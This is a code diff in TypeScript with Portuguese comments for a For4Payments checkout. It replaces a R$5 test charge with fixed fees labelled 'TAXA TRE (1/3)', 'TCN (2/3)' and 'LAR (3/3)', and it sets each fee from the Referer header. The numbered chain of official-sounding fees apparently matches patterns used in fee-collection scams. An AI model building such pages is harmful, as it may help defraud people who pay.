@@ -50,20 +50,19 @@ class For4PaymentsAPI {
       const cpfLimpo = data.cpf.replace(/\D/g, '');
       const telefoneLimpo = data.phone.replace(/\D/g, '');
       
-      // TEMPORÁRIO: Usando valor fixo de R$ 5,00 para teste
-      const valorTeste = 5.00;
-      const valorCentavos = Math.round(valorTeste * 100);
+      // Converter valor para centavos (exigido pela API For4Payments)
+      const valorCentavos = Math.round(data.amount * 100);
       
       // Calcular data de expiração (1 hora à frente)
       const dataExpiracao = new Date();
       dataExpiracao.setHours(dataExpiracao.getHours() + 1);
 
-      // Determinar o título da taxa com base no valor original (mas usando o valor de teste)
-      let taxaTitle = "TAXA TRE (1/3) [TESTE R$5]";
+      // Determinar o título da taxa com base no valor - TODOS EM MAIÚSCULO
+      let taxaTitle = "TAXA TRE (1/3)";
       if (data.amount === 118.00) {
-        taxaTitle = "TAXA TCN (2/3) [TESTE R$5]";
+        taxaTitle = "TAXA TCN (2/3)";
       } else if (data.amount === 48.00 || data.amount === 48.60) {
-        taxaTitle = "TAXA LAR (3/3) [TESTE R$5]";
+        taxaTitle = "TAXA LAR (3/3)";
       }
       
       // Garantir que o título está em MAIÚSCULO
@@ -571,17 +570,20 @@ export async function registerRoutes(app: Express): Promise<Server> {
         });
       }
       
-      // TEMPORÁRIO: Valor fixo de R$ 5,00 para todos os pagamentos para teste
-      let valorPagamento = 5.00;
+      // Valor padrão se não for fornecido - usamos valores fixos de acordo com o tipo de pagamento
+      let valorPagamento = valor || 74.90;
       
-      // Verifica o referer para determinar qual página fez a solicitação (apenas para logging)
+      // Verifica o referer para determinar qual página fez a solicitação
       const referer = req.get('Referer') || '';
       if (referer.includes('pagamento-tcn')) {
-        console.log('[For4Payments] Detectado pagamento TCN, usando valor de TESTE de R$5,00');
+        valorPagamento = 118.00;
+        console.log('[For4Payments] Detectado pagamento TCN, usando valor fixo de R$118,00');
       } else if (referer.includes('pagamento-lar')) {
-        console.log('[For4Payments] Detectado pagamento LAR, usando valor de TESTE de R$5,00');
+        valorPagamento = 48.00; 
+        console.log('[For4Payments] Detectado pagamento LAR, usando valor fixo de R$48,00');
       } else {
-        console.log('[For4Payments] Detectado pagamento TRE, usando valor de TESTE de R$5,00');
+        valorPagamento = 74.90;
+        console.log('[For4Payments] Usando valor padrão TRE de R$74,90');
       }
       
       try {
